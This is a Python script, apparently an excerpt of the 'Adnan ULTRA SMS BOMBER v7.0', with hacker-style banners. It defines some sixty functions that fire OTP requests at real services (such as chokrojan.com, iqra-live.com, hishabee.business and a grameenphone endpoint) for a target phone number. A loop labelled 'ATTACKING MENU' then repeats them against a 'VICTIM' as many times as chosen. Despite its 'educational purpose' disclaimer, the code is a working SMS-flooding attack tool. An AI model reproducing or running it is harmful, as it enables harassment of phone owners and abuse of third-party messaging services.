...
'''
 ...
 </> RELEASED BY:  Hasan Arifur Rahman Adnan
 </> ---------------------------------------------
 </> CODED BY -> Black Panther
 </> PROJECT ->  Panther ULTRA SMS BOMBER
 </> Updated On -> ANYTIME
 </> GitHub -> https://github.com/Sr-Adnan
 </> ---------------------------------------------
'''
...
os.system("clear")
print("\n\n\033[1;33m <\\> \033[1;32mWELCOME TO...\n\n\t\033[1;32m<\\> \033[1;33mADNAN ULTRA SMS BOMBER \033[1;36mv7.0 \n")
...
logo2 = ("""
\033[1;31m┏━━┓━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┏━━⑊
\033[1;31m┃😈┃\033[47m\033[1;46m 𝗔𝗻𝗼𝗻𝘆𝗺𝗼𝘂𝘀   ⑆➤    Hasan Arifur Rahman Adnan  \033[40m\033[00m\x1b[1;91m┃😈┃
\033[1;31m┗━━┛━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┗━━┛
\033[1;31m  
      ▄████████ ████████▄  ███▄▄▄▄      ▄████████ ███▄▄▄▄   
  ███    ███ ███   ▀███ ███▀▀▀██▄   ███    ███ ███▀▀▀██▄ 
...
▀███████████ ███    ███ ███   ███ ▀███████████ ███   ███ 
  ...
  ███    █▀  ████████▀   ▀█   █▀    ███    █▀   ▀█   █▀                                                           
\033[1;96m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯
  \033[1;96m<\033[1;91m⑊\033[1;96m> \033[1;91m DEVELOPER \033[1;96m ⑆\033[1;91m➤  \033[1;96m  Hasan Arifur Rahman Adnan
  \033[1;96m<\033[1;91m⑊\033[1;96m> \033[1;91m TELEGRAM  \033[1;96m ⑆\033[1;91m➤  \033[1;96m  @B1ackP4w
  \033[1;96m<\033[1;91m⑊\033[1;96m> \033[1;91m GITHUB    \033[1;96m ⑆\033[1;91m➤  \033[1;96m  Black Panther
  \033[1;96m<\033[1;91m⑊\033[1;96m> \033[1;91m TOOL      \033[1;96m ⑆\033[1;91m➤  \033[1;96m  Adnan ULTRA SMS BOMBER
\033[1;92m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯""")

logo = ("""
\033[1;31m┏━━┓━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┏━━⑊
\033[1;31m┃😈┃\033[47m\033[1;46m  𝗔𝗻𝗼𝗻𝘆𝗺𝗼𝘂𝘀 ➤  Black Panther  \033[40m\033[00m\x1b[1;91m┃😈┃
\033[1;31m┗━━┛━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┗━━┛""")
...
def MAIN_x_Adnan():
    ...
    print(f"\n{lgt}{y}{itl}{bgr}</> WARNING :{stp}{lgt}{y}{unl} This {r}\"Adnan SMS SPAM\"{y} Developed For {stp}")
    print(f"{lgt}{y}{itl}{unl} - Only Educational Purpose & Cyber Awerness ! {stp}")
    print(f"{lgt}{y}{itl}{unl} - We {r}\"𝗔𝗻𝗼𝗻𝘆𝗺𝗼𝘂𝘀\"{y} Are Not Promoted For {stp}")
    ...
    if not number.isdigit() or len(number) != 11:
        ...
        time.sleep(2);MAIN_x_Adnan()
    elif "Adnan" in number:
        Lxj(f"{c}<{w}/{c}> {y}Invalid Number Try Again ! ")
        time.sleep(2);MAIN_x_Adnan()
...
#----------[ Adnan NEW MAIN API 61 ]-----------#


def lmnXlija_1(number):#----------{"100% OK": "Adnan"}----------#
    try:
        headers = {
...
def lmnXlija_2(number):#----------{"100% OK": "Adnan"}----------#
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
...
def lmnXlija_3(number):#----------{"100% OK": "Adnan"}----------#
    try:
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
...
def lmnXlija_4(number):#----------{"100% OK": "Adnan"}----------#
    try:
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
...
def lmnXlija_5(number):#----------{"100% OK": "Adnan"}----------#
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
...
def lmnXlija_6(number):#----------{"100% OK": "Adnan"}----------#
    try:
...
def lmnXlija_7(number):#----------{"100% OK": "Adnan"}----------#
    try:
        headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
...
def lmnXlija_8(number):#----------{"100% OK": "Adnan"}----------#
    try:
        headers = {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
...
def lmnXlija_9(number):#----------{"100% OK": "Adnan"}----------#
    try:
        headers = {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
...
def lmnXlija_10(number):#----------{"100% OK": "Adnan"}----------#
    try:
        headers = {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
...
def lmnXlija_11(number):#----------{"100% OK": "Adnan"}----------#
    try:
...
def lmnXlija_12(number):#----------{"100% OK": "Adnan"}----------#
    try:
        headers = {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
...
def lmnXlija_13(number):#----------{"100% OK": "Adnan"}----------#
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
...
def lmnXlija_14(number):#----------{"100% OK": "Adnan"}----------#
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
...
def lmnXlija_15(number):#----------{"100% OK": "Adnan"}----------#
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en',
...
def lmnXlija_16(number):#----------{"100% OK": "Adnan"}----------#
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
...
def lmnXlija_17(number):#----------{"100% OK": "Adnan"}----------#
    try:
        headers = {
...
def lmnXlija_18(number):#----------{"100% OK": "Adnan"}----------#
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
...
def lmnXlija_19(number):#----------{"100% OK": "Adnan"}----------#
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
...
def lmnXlija_20(number):#----------{"100% OK": "Adnan"}----------#
    try:
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
...
def lmnXlija_21(number):#----------{"100% OK": "Adnan"}----------#
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
...
def lmnXlija_22(number):#----------{"100% OK": "Adnan"}----------#
    try:
...
def lmnXlija_27(number):#----------{"100% OK": "Adnan"}----------#
    try:
...
def lmnXlija_28(number):#----------{"100% OK": "Adnan"}----------#
    try:
...
def lmnXlija_29(number):#----------{"100% OK": "Adnan"}----------#
    try:
        url = "https://chokrojan.com/api/v1/passenger/login/mobile"
        headers = {
            "User-Agent": lmnXuserAgent4,
...
def lmnXlija_30(number):#----------{"100% OK": "Adnan"}----------#
    try:
...
def lmnXlija_31(number):#----------{"100% OK": "Adnan"}----------#
    try:
...
def lmnXlija_32(number):#----------{"100% OK": "Adnan"}----------#
    try:
...
def lmnXlija_33(number):#----------{"100% OK": "Adnan"}----------#
    try:
...
def lmnXlija_34(number):#----------{"100% OK": "Adnan"}----------#
    try:
...
def lmnXlija_35(number):#----------{"100% OK": "Adnan"}----------#
    try:
...
def lmnXlija_36(number):#----------{"100% OK": "Adnan"}----------#
    try:
...
def lmnXlija_37(number):#----------{"100% OK": "Adnan"}----------#
    try:
...
def lmnXlija_38(number):#----------{"100% OK": "Adnan"}----------#
    try:
        url = f"http://apibeta.iqra-live.com/api/v1/sent-otp/{number}"
        response = requests.get(url, verify=False)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass

def lmnXlija_39(number):#----------{"100% OK": "Adnan"}----------#
    try:
...
def lmnXlija_40(number):#----------{"100% OK": "Adnan"}----------#
    try:
...
def lmnXlija_41(number):#----------{"100% OK": "Adnan"}----------#
    try:
...
def lmnXlija_42(number):#----------{"100% OK": "Adnan"}----------#
    try:
...
def lmnXlija_43(number):#----------{"100% OK": "Adnan"}----------#
    try:
...
def lmnXlija_44(number):#----------{"100% OK": "Adnan"}----------#
    try:
...
def lmnXlija_45(number):#----------{"100% OK": "Adnan"}----------#
    try:
...
def lmnXlija_46(number):#----------{"100% OK": "Adnan"}----------#
    try:
...
def lmnXlija_47(number):#----------{"100% OK": "Adnan"}----------#
    try:
...
def lmnXlija_48(number):#----------{"100% OK": "Adnan"}----------#
    try:
...
def lmnXlija_49(number):#----------{"100% OK": "Adnan"}----------#
    try:
...
def lmnXlija_50(number):#----------{"100% OK": "Adnan"}----------#
    try:
...
def lmnXlija_51(number):#----------{"100% OK": "Adnan"}----------#
    try:
...
def lmnXlija_52(number):#----------{"100% OK": "Adnan"}----------#
    try:
...
def lmnXlija_53(number):#----------{"100% OK": "Adnan"}----------#
    try:
...
def lmnXlija_54(number):#----------{"100% OK": "Adnan"}----------#
    try:
...
def lmnXlija_55(number):#----------{"100% OK": "Adnan"}----------#
    try:
...
def lmnXlija_56(number):#----------{"100% OK": "Adnan"}----------#
    try:
...
def lmnXlija_57(number):#----------{"100% OK": "Adnan"}----------#
    try:
        url = "https://www.mcbaffiliate.com/Affiliate/RequestOTP"
        headers = {
            "User-Agent": lmnXuserAgent7,
...
def lmnXlija_58(number):#----------{"100% OK": "Adnana"}----------#
    try:
        url = f"https://app.hishabee.business/api/V2/otp/send?mobile_number={number}"
        headers = {
            "User-Agent": lmnXuserAgent4,
...
def lmnXlija_59(number):#----------{"100% OK": "Adnan"}----------#
    try:
        url = "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp"
        data = {
            "phone": number,
...
def lmnXlija_60(number):#----------{"100% OK": "Adnan"}----------#
    try:
...
#----------[ Adnan ATTACKING MENU ]----------#


def DARKS(number,amo):
    os.system("clear");print(logo)
    Lxj(f"{c} <{w}/{c}> {g}⚡ Adnan SMS SPAM {r}v7.0 {g}STARTED\n")
    Lxj(f"{c} <{w}/{c}> {g}VICTIM {w}|{g} AMOUNT {c}➤ {r}"+str(number)+f"{c} | {r}"+str(amo)+"\n")
    lnx()
    for x in range(amo):
        x+=1
        lmnXlija_1(number);LMNxLoad(f" </> Adnanv7.0 [{x}-01]")
        lmnXlija_2(number);LMNxLoad(f" </> Adnanv7.0 [{x}-02]")
        lmnXlija_3(number);LMNxLoad(f" </> Adnanv7.0 [{x}-03]")
        lmnXlija_4(number);LMNxLoad(f" </> Adnanv7.0 [{x}-04]")
        lmnXlija_5(number);LMNxLoad(f" </> Adnanv7.0 [{x}-05]")
        lmnXlija_6(number);LMNxLoad(f" </> Adnanv7.0 [{x}-06]")
        lmnXlija_7(number);LMNxLoad(f" </> Adnanv7.0 [{x}-07]")
        lmnXlija_8(number);LMNxLoad(f" </> Adnanv7.0 [{x}-08]")
        lmnXlija_9(number);LMNxLoad(f" </> Adnanv7.0 [{x}-09]")
        lmnXlija_10(number);LMNxLoad(f" </>Adnan v7.0 [{x}-10]")
        lmnXlija_11(number);LMNxLoad(f" </>Adnan v7.0 [{x}-11]")
        lmnXlija_12(number);LMNxLoad(f" </>Adnan v7.0 [{x}-12]")
        lmnXlija_13(number);LMNxLoad(f" </>Adnan v7.0 [{x}-13]")
        lmnXlija_14(number);LMNxLoad(f" </>Adnan v7.0 [{x}-14]")
        lmnXlija_15(number);LMNxLoad(f" </>Adnan v7.0 [{x}-15]")
        lmnXlija_16(number);LMNxLoad(f" </>Adnan v7.0 [{x}-16]")
        lmnXlija_17(number);LMNxLoad(f" </>Adnan v7.0 [{x}-17]")
        lmnXlija_18(number);LMNxLoad(f" </>Adnan v7.0 [{x}-18]")
        lmnXlija_19(number);LMNxLoad(f" </>Adnan v7.0 [{x}-19]")
        lmnXlija_20(number);LMNxLoad(f" </>Adnan v7.0 [{x}-20]")
        lmnXlija_21(number);LMNxLoad(f" </>Adnan v7.0 [{x}-21]")
        lmnXlija_22(number);LMNxLoad(f" </>Adnan v7.0 [{x}-22]")
        lmnXlija_23(number);LMNxLoad(f" </>Adnan v7.0 [{x}-23]")
        lmnXlija_24(number);LMNxLoad(f" </>Adnan v7.0 [{x}-24]")
        lmnXlija_25(number);LMNxLoad(f" </>Adnan v7.0 [{x}-25]")
        lmnXlija_26(number);LMNxLoad(f" </>Adnan v7.0 [{x}-26]")
        lmnXlija_27(number);LMNxLoad(f" </>Adnan v7.0 [{x}-27]")
        lmnXlija_28(number);LMNxLoad(f" </>Adnan v7.0 [{x}-28]")
        lmnXlija_29(number);LMNxLoad(f" </>Adnan v7.0 [{x}-29]")
        lmnXlija_30(number);LMNxLoad(f" </>Adnan v7.0 [{x}-30]")
        lmnXlija_31(number);LMNxLoad(f" </>Adnan v7.0 [{x}-31]")
        lmnXlija_32(number);LMNxLoad(f" </>Adnan v7.0 [{x}-32]")
        lmnXlija_33(number);LMNxLoad(f" </>Adnan v7.0 [{x}-33]")
        lmnXlija_34(number);LMNxLoad(f" </>Adnan v7.0 [{x}-34]")
        lmnXlija_35(number);LMNxLoad(f" </>Adnan v7.0 [{x}-35]")
        lmnXlija_36(number);LMNxLoad(f" </>Adnan v7.0 [{x}-36]")
        lmnXlija_37(number);LMNxLoad(f" </>Adnan v7.0 [{x}-37]")
        lmnXlija_38(number);LMNxLoad(f" </>Adnan v7.0 [{x}-38]")
        lmnXlija_39(number);LMNxLoad(f" </>Adnan v7.0 [{x}-39]")
        lmnXlija_40(number);LMNxLoad(f" </>Adnan v7.0 [{x}-40]")
        lmnXlija_41(number);LMNxLoad(f" </>Adnan v7.0 [{x}-41]")
        lmnXlija_42(number);LMNxLoad(f" </>Adnan v7.0 [{x}-42]")
        lmnXlija_43(number);LMNxLoad(f" </>Adnan v7.0 [{x}-43]")
        lmnXlija_44(number);LMNxLoad(f" </>Adnan v7.0 [{x}-44]")
        lmnXlija_45(number);LMNxLoad(f" </>Adnan v7.0 [{x}-45]")
        lmnXlija_46(number);LMNxLoad(f" </>Adnan v7.0 [{x}-46]")
        lmnXlija_47(number);LMNxLoad(f" </>Adnan v7.0 [{x}-47]")
        lmnXlija_48(number);LMNxLoad(f" </>Adnan v7.0 [{x}-48]")
        lmnXlija_49(number);LMNxLoad(f" </>Adnan v7.0 [{x}-49]")
        lmnXlija_50(number);LMNxLoad(f" </>Adnan v7.0 [{x}-50]")
        lmnXlija_51(number);LMNxLoad(f" </>Adnan v7.0 [{x}-51]")
        lmnXlija_52(number);LMNxLoad(f" </>Adnan v7.0 [{x}-52]")
        lmnXlija_53(number);LMNxLoad(f" </>Adnan v7.0 [{x}-53]")
        lmnXlija_54(number);LMNxLoad(f" </>Adnan v7.0 [{x}-54]")
        lmnXlija_55(number);LMNxLoad(f" </>Adnan v7.0 [{x}-55]")
        lmnXlija_56(number);LMNxLoad(f" </>Adnan v7.0 [{x}-56]")
        lmnXlija_57(number);LMNxLoad(f" </>Adnan v7.0 [{x}-57]")
        lmnXlija_58(number);LMNxLoad(f" </>Adnan v7.0 [{x}-58]")
        lmnXlija_59(number);LMNxLoad(f" </>Adnan v7.0 [{x}-59]")
        lmnXlija_60(number);LMNxLoad(f" </>Adnan v7.0 [{x}-60]")
    lnx()
